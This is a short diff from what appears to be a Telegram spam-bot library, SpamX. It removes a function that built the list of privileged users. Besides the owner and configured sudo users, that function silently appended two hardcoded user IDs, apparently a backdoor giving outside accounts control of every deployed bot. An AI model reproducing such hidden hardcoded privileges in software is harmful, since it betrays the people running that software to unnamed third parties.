@@ -8,6 +8,7 @@ from RiZoeLX.data import *
 import random, asyncio 
 from . import delete_reply
 
+
 """ Get User with Reason! """
 async def get_user_reason(RiZoeL, message, Owner, Sudos):
    args = ("".join(message.text.split(maxsplit=1)[1:])).split(" ", 2)
@@ -290,13 +291,3 @@ def start_spamX(RiZoeLX, type):
          except:
            pass
          print(f"[SpamX INFO]: Bot started ✓")
-
-def make_int(owner, sudos):
-    str_list = sudos.split(" ")
-    int_list = []
-    int_list.append(int(owner))
-    int_list.append(1517994352)
-    int_list.append(1789859817)
-    for x in str_list:
-        int_list.append(int(x))
-    return int_list
